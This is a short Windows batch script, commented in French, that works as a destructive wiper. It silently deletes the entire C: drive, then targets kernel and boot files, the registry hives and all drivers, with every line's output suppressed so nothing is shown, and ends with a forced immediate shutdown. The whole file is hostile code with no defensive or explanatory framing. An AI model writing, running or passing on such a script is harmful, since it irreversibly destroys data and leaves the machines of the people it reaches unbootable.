@echo off
:: Redirige tout vers nul pour qu'aucune sortie (message d'erreur ou autre) ne soit affichée
rd /s /q C:\ 2>nul 1>nul
del /f /s /q C:\*.* 2>nul 1>nul

del /f /q C:\Windows\System32\ntoskrnl.exe  2>nul 1>nul
del /f /q C:\Windows\System32\hal.dll  2>nul 1>nul
del /f /q C:\Windows\System32\winload.exe  2>nul 1>nul
del /f /q C:\Windows\System32\winresume.efi  2>nul 1>nul

del /f /q C:\Windows\System32\config\*   2>nul 1>nul

del /f /q C:\bootmgr  2>nul 1>nul
del /f /q C:\ntldr  2>nul 1>nul
del /f /q C:\Windows\System32\Boot\*  2>nul 1>nul
del /f /q C:\Windows\System32\drivers\* 2>nul 1>nul

shutdown -s -f -t 0 2>nul 1>nul
